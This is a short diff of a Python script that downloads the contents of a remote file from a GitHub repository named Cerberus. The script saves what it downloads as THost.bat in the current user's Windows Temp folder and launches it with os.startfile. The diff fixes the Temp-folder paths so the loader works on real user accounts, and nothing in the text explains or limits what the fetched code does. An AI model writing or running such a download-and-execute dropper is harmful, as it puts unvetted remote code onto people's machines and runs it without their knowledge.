@@ -4,7 +4,7 @@ from bs4 import BeautifulSoup
 
 x = os.getlogin()
 
-filename = os.path.join("AppData/Local/Temp/THost.bat")
+filename = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp/THost.bat")
 
 with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/TSource3.txt") as response:
     data = response.read().decode("utf-8")
@@ -12,6 +12,6 @@ with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerber
 
 #urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/TSource3.txt", filename)
 
-os.chdir(os.path.join("AppData/Local/Temp"))
+os.chdir("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp")
 os.startfile("THost.bat")
 # exec(open(filename).read())
